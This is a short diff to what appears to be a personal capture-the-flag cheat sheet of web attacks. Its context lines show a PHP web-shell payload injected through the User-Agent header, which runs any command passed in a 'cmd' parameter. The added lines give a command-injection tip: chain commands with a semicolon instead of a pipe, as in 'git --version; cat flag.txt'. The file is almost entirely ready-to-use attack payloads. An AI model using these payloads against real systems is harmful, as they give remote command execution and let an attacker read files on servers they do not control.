@@ -31,3 +31,7 @@ User-Agent: <?php echo system($_GET['cmd']); ?>
 
 ======= FILTERS =======
 Easy: case sensitive
+
+======= COMMAND INJECTION ==========
+instead of using | to next cmd, try ;
+git --version; cat flag.txt
